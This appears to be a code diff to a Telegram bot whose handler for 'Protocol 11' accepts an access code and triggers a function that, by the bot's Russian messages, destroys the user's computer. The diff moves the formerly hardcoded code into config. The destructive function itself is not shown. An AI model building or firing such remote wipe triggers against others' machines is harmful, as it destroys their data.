@@ -295,9 +295,10 @@ async def telegram_bot():
 
     @dp.message_handler(state=Protocol11States.waiting_for_code, content_types=types.ContentTypes.TEXT)
     async def access_code_handler(message: types.Message, state: FSMContext):
-        if message.text == 'lockddos2024_123':
+        if message.text == getConfigInfo('protocols', 'code_protocol_11'):
             await message.answer("<b>☁️ Код доступа принят.</b> <i>Выполняется команда по уничтожению компьютера.\n\n<b>🔌 Надеюсь вы успели сохранить свои данные :)</b></i>", parse_mode=types.ParseMode.HTML)
-            await protocol_11('lockddos2024_123')
+            code = getConfigInfo('protocols', 'code_protocol_11')
+            protocol_11(code)
             await message.answer("<b>☁️ Команда выполнена.</b>", parse_mode=types.ParseMode.HTML)
             await state.finish()
         else:
